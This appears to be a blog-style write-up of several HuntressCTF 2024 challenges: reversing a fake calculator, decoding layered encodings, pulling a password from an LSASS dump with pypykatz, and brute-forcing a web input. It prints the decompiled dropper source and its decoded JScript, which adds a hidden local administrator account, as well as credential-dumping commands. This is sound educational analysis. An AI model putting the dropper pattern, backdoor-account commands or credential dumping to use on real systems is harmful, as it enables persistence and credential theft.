---
title: HuntressCTF 2024
draft: false
tags:
  - ctf
---
# Strange Calc

> I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run?? 

Taking a look at `file calc.exe`, we can see `calc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed` which means it's a Windows executable and also packed with UPX. 

We can unpack it with [UPX](https://upx.github.io/) by running `upx -d calc.exe`. Once unpacked, I decided to analyze the strings using [flare-floss](https://github.com/mandiant/flare-floss) to see if there's any encoded or dynamically generated strings. 

```
\t<assemblyIdentity
\t    type="win32"
\t    processorArchitecture="*"
\t    version="3.0.0.0"
\t    name="AutoIt3"
```

The string `AutoIt3` is a dead giveaway that this is an AutoIt script compiled into an executable. We can decompile it using [AutoIT Extractor](https://github.com/digitalsleuth/autoit-extractor) and get the source code. 

```autoit
; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
#NoTrayIcon
#Region
#AutoIt3Wrapper_Change2CUI=y
#EndRegion
If Not IsAdmin() Then
    MsgBox(16, "Error", "You must have administrator privileges.")
    Exit
EndIf
Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
Local $b = x($a)
Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
Func r($aa)
    Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    Local $s = ""
    For $i = 1 To $aa
        $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
    Next
    Return $s
EndFunc   ;==>r
Local $d = FileOpen($c, 2)
If $d = -1 Then
    MsgBox(16, "Error", "Failed to open the calculator.")
    Exit
EndIf
FileWrite($d, $b)
FileClose($d)
FileSetAttrib($c, "+H")
FileSetAttrib($c, "+S")
Func x($e)
    Local $f = DllStructCreate("dword")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", 0, _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", DllStructGetPtr($g), _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Return BinaryToString(DllStructGetData($g, 1))
EndFunc   ;==>x
$o = ObjCreate("MSScriptControl.ScriptControl")
$o.Language = "JScript"
$p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
$o.ExecuteStatement($p)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
```

We can see an interesting string `$a` that is encoded and decoded using the `x` function. The decoded string is then written to a file `r(4) & r(2) & r(3) & r(1) & ".jse"` and executed using `MSScriptControl.ScriptControl`. We can [base64 decode the string and then convert from Microsoft Script encoding](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Microsoft_Script_Decoder()&input=STBCK1htTlJUVUZCUVQwOVZ5RjRYa1JyUzNoUWJXQW9ZZ2szYkM1UU1TZEZSVUpPSnlnZ0wyRldhMFJqUlMwSlNpcHBWMWN1WXpkc0xsQi9lQ0Z3SzBBaFcyTldLMVZNUkhSSkt6TlJLZ2t0YlVRc01DYzVKSDlFVWswck1sWnRiVzVqU2pjdGExRjFKeTlmWmlaTWZrVkNLbWx5TUdOWFkydFZUbjloY2paZ1JUaC9iMnRWUlNvbmVDZGFheTB3SUdKNE9TczJmVEIyUlNzSlRrVWpleWQ0VkMxMU1IdDRKM0pLSXpGSFZWbGllQ0VyU1Z4RExpeHZlR0EySUcwMGJDNHZTMDRyS1U5MklXSlBNaXNxVzM4eWFUWlhSSFpjYlM1UU5DZHhhVFJBSVZjZ1hpdDRWRTkwY0hSZmV5cGlDV0l3ZG5SUkprQXFlRFpTY3lzSlRGazBJemd1ZjJ3elNTMXRSSDVyZTJNMlVsNDBiRTFhVnprcmVrOWdOQ05TSm5rakozOHlma3g3WXpCamJYUnRMaTlYT1N0NldXTjBVWEVxVDJZZ0tpZDJNbjVXZUhZd1VsNDBiVVF2VnpsdWVsbGpORjk1STA4eUlDb25kakorY3lkMk1DQmVOR3hFTzBkT2YySlpkalJSSmlwUE1pQmlXMzltY0cxUkoxVlBSR0o0VENBMlJGZG9MelJzTGxwTFczOWdZMkpBSVVBaElDTXRZRTVBS2tBcVZ5TmlhV0l3WXpReklFQWhOaUJXZjNodlJEUlNSaXB0TXlkcVdTNXlDVzhnTUUxSE9qdDBReTQ3VjA1dVkzWmdKVnM0V0NwQUlVQWhWeU10WUROQUtrQXFlV0lqY0d0WFlEUmZaa0FoTmxKV2YxVnZSSFJQT0dKZVgzcy9SRVJ5ZUV3Z05rUkhPanMwYkUxYVIxdC9ZR0JqVmt3bVlrQWhRQ0YvS25WektqZ3BSQ3RFUlUxVlVERlNaRVVvTDA4dVluaHZkbFIrVkNNNE4wTXVVSE1uY2pSdWIzSlZMSFlxWXl4U0xRbE5NVzgxWWl3SlNrbFNabUFpTVhkZ1hVSjJkV0lzTzE1eFVpWjdNbE11VDJZd0wzWW9MRnRBSVNoakppSjZVbjhoU1g1eFMwMHRWWHduZUc1NE9VVnBOMnd1ZmdrbmJHTm9LbWt0YkUxK1N5Y3NjbmgvV1ZBaEwzOHVVR1JYWG14ZVlsdG9ZbmhyYTA5RWJWbFhUWDVGWHdsZmNsQW1iRnRiY241RmVIOVBVRjVYWGtOZWIwUkhPMkZRUTA1emNnbHJaRVJFYlZsWFRTOHNTbGN4YkhOaU9UcHlWV0l2V1UxRFdVdEVVRXBEVzA1eWZuSnRRMVplSUg4MmJrcFpTVnh0Ukg0eWUzZ3JRWDU2YlU5ck4yNXZjamhPS3pGWllFVi9WVjVFWW5kUFVsVjBibk5lUWlOd1YxZE5ZRnh0TG40N2V5RndPMEFoVnlCemYzaE1XVFJTUm5BN1VWRXFDWGNnWFNGNFkxZGROVmwrVkVJd2JWWXZmeU1wTWxJaVJWVmdTeVFyUkVKR2ZqWkRWbXNySTNBMFVrRkNRVUU5UFY0amZrQT0&oeol=NEL) to get the plaintext code.

```javascript
function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);
```

Lastly, I converted the Javascript code to Python and ran it to get the flag. 

```python
import subprocess

def decode_base64(encoded_string):
    decoded_string = ""
    lines = encoded_string.split("\n")

    for line in lines:
        current_line = line.strip()

        char_offset = (ord(current_line[0]) - 32) & 63

        for h in range(1, len(current_line), 4):
            if h + 3 >= len(current_line):
                break

            i = (ord(current_line[h]) - 32) & 63
            j = (ord(current_line[h + 1]) - 32) & 63
            k = (ord(current_line[h + 2]) - 32) & 63
            l = (ord(current_line[h + 3]) - 32) & 63

            decoded_string += chr((i << 2) | (j >> 4))

            if h + 2 < len(current_line) - 1:
                decoded_string += chr(((j & 15) << 4) | (k >> 2))

            if h + 3 < len(current_line) - 1:
                decoded_string += chr(((k & 3) << 6) | l)

    return decoded_string[:char_offset]

encoded_string = "G9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*"
decoded_value = decode_base64(encoded_string)
print(decoded_value)
```

And we get the flag!

# Base-p-

> That looks like a weird encoding, I wonder what it's based on. 

```
楈繳籁萰杁癣怯蘲詶歴蝕絪敪ꕘ橃鹲𠁢腂𔕃饋𓁯𒁊鹓湵蝱硦楬驪腉繓鵃舱𒅡繃絎罅陰罌繖𔕱蝔浃虄眵虂𒄰𓉋詘襰ꅥ破ꌴ顂𔑫硳蕈訶𒀹饡鵄腦蔷樸𠁺襐浸椱欱蹌ꍣ鱙癅腏葧𔕇鱋鱸𓁮聊聍ꄸꈴ陉𔕁框ꅔ𔕩𔕃驂虪祑𓅁聨朸聣摸眲葮𖠳鵺穭𒁭豍摮饱恕𓉮詔葉鰸葭楷洳面𔕃𔑒踳𔐸杅𐙥湳橹驳陪楴氹橬𓄱蝔晏稸ꄸ防癓ꉁ𖡩鵱聲ꍆ稸鬶魚𓉯艭𔕬輷茳筋𔑭湰𓄲怸艈恧襺陷项譶ꍑ衮汮蹆杗筌蹙怰晘缸睰脹蹃鹬ꕓ脶湏赑魶繡罢𒉁荶腳ꌳ蕔𔐶橊欹𖥇繋赡𐙂饎罒鵡𒉮腙ꍮ楑恤魌虢昹𒅶效楙衎𔕙ꉨ𓈸𔑭樯筶筚絮𓁗浈豱ꉕ魔魧蕕聘筣鹖樫ꍖ汸湖萰腪轪𓉱艱絍笹艨魚詇腁𒁮陴顮虂癁
```

Looking at the characters, it resembles base65536 encoding. I used an online [base65536 decoder](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode) to decode the string. This reveals a base64 encoded string:

```
H4sIAG0OA2cA/+2QvUt6URjHj0XmC5ribzBLCwKdorJoSiu9qRfCl4jeILSICh1MapCINHEJpaLJVIqwTRC8DQ5BBQ0pKtXUpTej4C4lBckvsCHP6U9oadDhfL7P85zzPTx81416LYclYgEAOLgOGwKgxgnrJKMK8j4kIaAwF3TjiwCwBejQQDAshK82cKx/2BnO3xzhmEmoMWn/qdU+ntTUIO8gmOw438bbCwRv3Y8vE2ens9y5sejat497l51sTRO18E8j2aSAAkixqhrKFl8E6fZfotmMlw7Z3NKFmvp92s8+HMg+zTwaycvVQlnSn7FYW2LFYY0+X18JpB9LCYliSm6LO9QXvfaIbJAqvNsL3lTP6vJ596GyKIaXBnNdRJahnqYLnlQ4d+LfbQ91vpH0Y4NSYwhk8tmv/5vFZFnHWrH8qWUkTfgfUPXKcFVi+5Vlx7V90OjLjZqtqMMH9FhMZfGUALnotancBQAA
```

Popping it into handy [CyberChef](https://gchq.github.io/CyberChef/) and using magic reveals it's a gzip compressed file. By base64 decoding and decompressing the file, we get a PNG. Using an online color picker [like here](https://imagecolorpicker.com/), we can get the hex value of each palette color and convert it to ASCII to get the flag.

# Mimi

> Uh oh! Mimi forgot her password for her Windows laptop! Luckily, she dumped one of the crucial processes running on her computer (don't ask me why, okay)... can you help her recover her password? NOTE: This file on its own is not malware per say, but it is likely to raise antivirus alerts. Would recommend examining this inside of a virtual environment. NOTE: Archive password is mimi

First, let's unzip the archive using `7z x mimi.zip` and take a look at the file using `file mimi`:

```
mimi: Mini DuMP crash report, 18 streams, Tue Sep 10 02:33:22 2024, 0x461826 type
```

Based on the challenge prompt, we assume this is a memory dump of LSASS. Volatility does not support MiniDump files, but **Mimi**katz does ;). I spent a decent amount of time trying to get Mimikatz running on my Desktop (thanks Defender...) but kept running into errors. After some searching, I learned of [pypykatz](https://github.com/skelsec/pypykatz) which is a pure Python implementation of Mimikatz. 

```
python3 -m pip install pypykatz --break-system-packages
pypykatz lsa minidump ~/Downloads/mimi
```

Scrolling up to the very top we see a LogonSession for the user `mimi`:

```
== LogonSession ==
authentication_id 709786 (ad49a)
session_id 1
username mimi
domainname windows11
logon_server WINDOWS11
logon_time 2024-09-10T02:32:50.802254+00:00
sid S-1-5-21-940291183-874774319-2012240919-1002
luid 709786
	== MSV ==
		Username: mimi
		Domain: windows11
		LM: NA
		NT: 5e088b316cc30d7b2d0158cb4bd9497c
		SHA1: c1bd67cf651fdbcf27fd155f488721f52fff64fa
		DPAPI: c1bd67cf651fdbcf27fd155f488721f52fff64fa
	== WDIGEST [ad49a]==
		username mimi
		domainname windows11
		password flag{7a565a86761a2b89524bf7bb0d19bcea}
		password (hex)66006c00610067007b00370061003500360035006100380036003700360031006100320062003800390035003200340062006600370062006200300064003100390062006300650061007d0000000000
	== Kerberos ==
		Username: mimi
		Domain: windows11
	== WDIGEST [ad49a]==
		username mimi
		domainname windows11
		password flag{7a565a86761a2b89524bf7bb0d19bcea}
		password (hex)66006c00610067007b00370061003500360035006100380036003700360031006100320062003800390035003200340062006600370062006200300064003100390062006300650061007d0000000000
	== DPAPI [ad49a]==
		luid 709786
		key_guid 0432784d-4b00-4b75-83af-2cdcc9aabb23
		masterkey a862ddb9e230fd284a02322c308ee1acd85a76b672c733cdbe6492462c5ded9709d319da4c9ec96e1f4cc52650ee0122be61938eef489182fb01bf313b1a56ab
		sha1_masterkey bb1bff78b80d6d4aeb9d78502bb32d77715ccc00
```

And we see the flag in the WDIGEST section!

# System Code

> Follow the white rabbit. NOTE: Bruteforce is permitted for this challenge instance if you feel it is necessary. 

rant: this was such a bad challenge. 

We are given a website that prompts you for an input. 

![[Pasted image 20241008183320.png]]

The first thing that stood out was the `Credit` button which links to the [repository](https://github.com/Rezmason/matrix) the website is based off of. 

The challenge author gave a lot of hints regarding recon and enumeration, so my first though was `feroxbuster`, but there wasn't any files or directories found using `common.txt`, `directory-list-2.3.*`, etc. So, I then focused on the GitHub repo. For example, `README.md` exists, but does it exist on the webserver (assuming they just did a `git clone`). Trying http://challenge.ctf.games:32436/README.md we see it exists! So, let's compare all the GitHub files to get a list of all the different files to further hone in on. 

```python
import requests
import os
import json
import sys
from urllib.parse import unquote, quote

# # Get all files inside of './matrix' directory (recursively)
# files = []
# for root, _, filenames in os.walk('matrix'):
#     for filename in filenames:
#         files.append(os.path.join(root, filename))

# URL = 'http://challenge.ctf.games:32547'

# for file in files:
#     urlPath = file.replace(r"matrix/", "")
#     urlPath = quote(urlPath)
#     r = requests.get(f"{URL}/{urlPath}")
#     #print(f"Requesting {URL}/{urlPath}")
#     if r.status_code == 200:
#         # Compare this file to the original
#         with open(file, "rb") as f:
#             original = f.read()
#         if r.content != original:
#             print(f"File {file} is different")
#         else:
#             print(f"File {file} is the same")
#     else:
#         continue
```

Running this, we get

```
File matrix/glyph order.txt is the same
File matrix/LICENSE is the same
File matrix/prettier_command.txt is the same
File matrix/screenshot.png is the same
File matrix/README.md is the same
File matrix/webgpu_notes.txt is the same
File matrix/js/colorToRGB.js is the same
File matrix/js/config.js is different
File matrix/js/main.js is the same
File matrix/js/camera.js is the same
File matrix/js/webgpu/mirrorPass.js is the same
File matrix/js/webgpu/endPass.js is the same
File matrix/js/webgpu/stripePass.js is the same
File matrix/js/webgpu/main.js is the same
File matrix/js/webgpu/rainPass.js is the same
File matrix/js/webgpu/palettePass.js is the same
File matrix/js/webgpu/utils.js is the same
File matrix/js/webgpu/bloomPass.js is the same
File matrix/js/webgpu/imagePass.js is the same
File matrix/js/regl/quiltPass.js is the same
File matrix/js/regl/mirrorPass.js is the same
File matrix/js/regl/stripePass.js is the same
File matrix/js/regl/main.js is the same
File matrix/js/regl/rainPass.js is the same
File matrix/js/regl/palettePass.js is the same
File matrix/js/regl/utils.js is the same
File matrix/js/regl/lkgHelper.js is the same
File matrix/js/regl/bloomPass.js is the same
File matrix/js/regl/imagePass.js is the same
File matrix/svg sources/texture_simplified.svg is the same
File matrix/svg sources/coptic_texture_simplified.svg is the same
File matrix/svg sources/gothic_texture_simplified.svg is the same
File matrix/svg sources/huberfish_a.svg is the same
File matrix/svg sources/huberfish_d.svg is the same
File matrix/shaders/glsl/quiltPass.frag.glsl is the same
File matrix/shaders/glsl/rainPass.intro.frag.glsl is the same
File matrix/shaders/glsl/stripePass.frag.glsl is the same
File matrix/shaders/glsl/bloomPass.combine.frag.glsl is the same
File matrix/shaders/glsl/palettePass.frag.glsl is the same
File matrix/shaders/glsl/rainPass.frag.glsl is the same
File matrix/shaders/glsl/rainPass.effect.frag.glsl is the same
File matrix/shaders/glsl/bloomPass.highPass.frag.glsl is the same
File matrix/shaders/glsl/bloomPass.blur.frag.glsl is the same
File matrix/shaders/glsl/rainPass.raindrop.frag.glsl is the same
File matrix/shaders/glsl/rainPass.symbol.frag.glsl is the same
File matrix/shaders/glsl/rainPass.vert.glsl is the same
File matrix/shaders/glsl/imagePass.frag.glsl is the same
File matrix/shaders/glsl/mirrorPass.frag.glsl is the same
File matrix/shaders/wgsl/imagePass.wgsl is the same
File matrix/shaders/wgsl/stripePass.wgsl is the same
File matrix/shaders/wgsl/endPass.wgsl is the same
File matrix/shaders/wgsl/palettePass.wgsl is the same
File matrix/shaders/wgsl/bloomBlur.wgsl is the same
File matrix/shaders/wgsl/bloomCombine.wgsl is the same
File matrix/shaders/wgsl/rainPass.wgsl is the same
File matrix/shaders/wgsl/mirrorPass.wgsl is the same
File matrix/lib/regl.js is the same
File matrix/lib/holoplaycore.module.js is the same
File matrix/lib/regl.min.js is the same
File matrix/lib/gpu-buffer.js is the same
File matrix/lib/gl-matrix.js is the same
File matrix/assets/megacity_msdf.png is the same
File matrix/assets/msdf_command.txt is the same
File matrix/assets/pixel_grid.png is the same
File matrix/assets/gtarg_tenretniolleh_msdf.png is the same
File matrix/assets/metal.png is the same
File matrix/assets/gothic_msdf.png is the same
File matrix/assets/gtarg_alientext_msdf.png is the same
File matrix/assets/matrixcode_msdf.png is the same
File matrix/assets/resurrections_glint_msdf.png is the same
File matrix/assets/huberfish_a_msdf.png is the same
File matrix/assets/neomatrixology_msdf.png is the same
File matrix/assets/Matrix-Code.ttf is the same
File matrix/assets/huberfish_d_msdf.png is the same
File matrix/assets/mesh.png is the same
File matrix/assets/resurrections_msdf.png is the same
File matrix/assets/Matrix-Resurrected.ttf is the same
File matrix/assets/sand.png is the same
File matrix/assets/coptic_msdf.png is the same
File matrix/playdate/.gitignore is the same
File matrix/playdate/INSTRUCTIONS.md is the same
File matrix/playdate/matrix_lua/Source/main.lua is the same
File matrix/playdate/matrix_lua/Source/pdxinfo is the same
File matrix/playdate/matrix_lua/Source/images/matrix-glyphs.png is the same
File matrix/playdate/matrix_lua/Source/images/fade-gradient.png is the same
File matrix/playdate/matrix_c/CMakeLists.txt is the same
File matrix/playdate/matrix_c/main.c is the same
File matrix/playdate/matrix_c/Source/pdxinfo is the same
File matrix/playdate/matrix_c/Source/images/matrix-glyphs.png is the same
File matrix/playdate/matrix_c/Source/images/fade-gradient.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/88.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/77.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/63.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/62.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/76.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/89.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/60.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/74.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/48.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/animation.txt is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/49.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/75.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/61.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/59.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/65.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/71.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/70.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/64.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/58.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/8.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/72.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/66.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/67.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/73.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/9.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/14.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/28.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/29.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/15.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/17.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/16.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/12.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/13.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/39.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/11.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/10.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/38.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/35.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/21.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/20.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/34.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/22.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/36.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/37.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/23.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/27.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/33.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/32.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/26.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/18.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/30.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/24.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/25.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/31.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/19.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/95.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/81.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/4.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/56.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/42.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/43.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/5.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/57.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/80.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/94.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/82.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/41.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/55.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/7.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/69.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/68.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/54.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/6.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/40.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/83.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/87.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/93.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/78.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/44.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/2.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/50.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/3.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/51.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/45.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/79.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/92.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/86.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/90.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/84.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/53.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/1.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/47.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/46.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/52.png is the same
File matrix/playdate/matrix_c/Source/images/launcher/card-highlighted/85.png is the same
```

There is only **one** different file, `js/config.js`. This is where I got stuck for a while, trying to compare the webserver's config.js to the GitHub default config.js. One though was the color palette-- maybe the `hsl()` colors if converted to HEX would be an ASCII string? But, that didn't really get me anywhere. 

My next thought was just bruteforcing strings (since the challenge permits it), so started trying characters, quotes, etc from `The Matrix` and `Alice in Wonderland` but no dice there either. 

I went back to analyzing the `config.js` since it was my only lead and noticed a configuration property called `backupGlyphsTwr` which had zero references in the GitHub. 

```js
backupGlyphsTwr: ["a", "b", "c", "d", "e", "f"], // The characters to fallback to if glyphs fail to load
```

![[Pasted image 20241008185032.png]]
It wasn't until I took a break and got home I realized `Twr` was `THE WHITE RABBIT!!` So, I generated permutations of abcdef to try as inputs.

```python
import itertools
import requests
import concurrent.futures

# The characters to permute
characters = 'abcdef'

# Function to generate and print permutations of various lengths
def generate_permutations(characters, min_size, max_size):
    perms = []
    for size in range(min_size, max_size + 1):
        permutations = list(itertools.permutations(characters, size))
        print(f"Permutations of size {size}:")
        for perm in permutations:
            perms.append(perm)
            print(''.join(perm))
        print("\n")
    return perms

# Call the function for sizes 4 to 6
perms = generate_permutations(characters, 4, 6)

def check_permutation(perm):
    url = 'http://challenge.ctf.games:30467/enter='
    r = requests.get(f"{url}{''.join(perm)}")
    if "Incorrect" not in r.text:
        return r.text
    return None

